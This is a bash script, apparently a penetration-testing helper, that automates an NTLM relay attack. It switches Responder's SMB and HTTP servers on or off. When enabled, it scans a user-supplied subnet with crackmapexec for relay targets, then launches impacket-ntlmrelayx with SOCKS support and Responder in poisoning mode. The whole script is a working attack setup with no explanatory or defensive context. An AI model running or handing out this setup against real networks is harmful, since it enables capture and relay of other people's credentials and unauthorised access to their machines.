#!/bin/bash

# Check if the script is run as root
if [ "$EUID" -ne 0 ]; then
    echo "This script must be run as root."
    exit 1
fi

# Define the list of terminal emulators
terminal_emulators=("gnome-terminal" "konsole" "xterm" "mate-terminal" "lxterminal" "xfce4-terminal" "qterminal")

# Check if any of the terminal emulators are available
found_terminal=""
for terminal in "${terminal_emulators[@]}"; do
    if command -v "$terminal" &> /dev/null; then
        found_terminal="$terminal"
        break
    fi
done

# If no compatible terminal emulator is found, exit
if [ -z "$found_terminal" ]; then
    echo "No compatible terminal emulator found. Exiting."
    exit 1
fi

RESPONDER_CONF="/etc/responder/Responder.conf"

# Check if Responder.conf file exists
if [ ! -f "$RESPONDER_CONF" ]; then
    echo "Responder.conf file not found at $RESPONDER_CONF"
    exit 1
fi

# Check if the correct number of arguments is provided
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <enable|disable>"
    exit 1
fi

option="$1"

case $option in
    "enable")
        sed -i 's/HTTP = Off/HTTP = On/' "$RESPONDER_CONF"
        sed -i 's/SMB = Off/SMB = On/' "$RESPONDER_CONF"
        echo "SMB and HTTP servers have been turned on in Responder.conf"
        ;;
    "disable")
        sed -i 's/HTTP = On/HTTP = Off/' "$RESPONDER_CONF"
        sed -i 's/SMB = On/SMB = Off/' "$RESPONDER_CONF"
        echo "SMB and HTTP servers have been turned off in Responder.conf"
        echo "Script completed."
        exit 0
        ;;
    *)
        echo "Invalid option. Use 'enable' or 'disable'."
        exit 1
        ;;
esac

# Prompt for a subnet
read -p "Enter the subnet (e.g., 192.168.1.0/24): " subnet

# Generate SMB targets file using crackmapexec
TARGET_FILE="smb_targets.txt"
crackmapexec smb --gen-relay-list "$TARGET_FILE" "$subnet"

# Start impacket-ntlmrelayx in a new terminal
"$found_terminal" -- bash -c "impacket-ntlmrelayx -socks -smb2support -tf $TARGET_FILE; exec bash"

# Start Responder in a new terminal
"$found_terminal" -- bash -c "responder -I eth0 -rdw -v; exec bash"

echo "impacket-ntlmrelayx and Responder started."
echo "Script completed."
